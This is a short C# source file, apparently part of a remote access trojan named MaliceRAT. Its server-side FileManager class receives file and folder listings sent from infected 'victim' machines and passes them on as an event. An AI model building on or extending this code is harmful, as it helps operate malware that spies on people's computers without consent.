using System;

namespace MaliceRAT.RatServer.Features
{
    public class FileManager
    {
        #region Events
        public event Action<Victim, string> FilesAndFoldersReceived;
        #endregion

        #region Variables
        private Server server;
        #endregion

        #region Constructor
        public FileManager(Server server)
        {
            this.server = server;
            server.MessageReceived += OnMessageReceived;
        }
        #endregion

        private void OnMessageReceived(Victim victim, dynamic message)
        {
            if (message["type"] == "files_and_folders")
            {
                string filesAndFoldersJson = message["filesAndFolders"];
                FilesAndFoldersReceived?.Invoke(victim, filesAndFoldersJson);
            }
        }
    }
}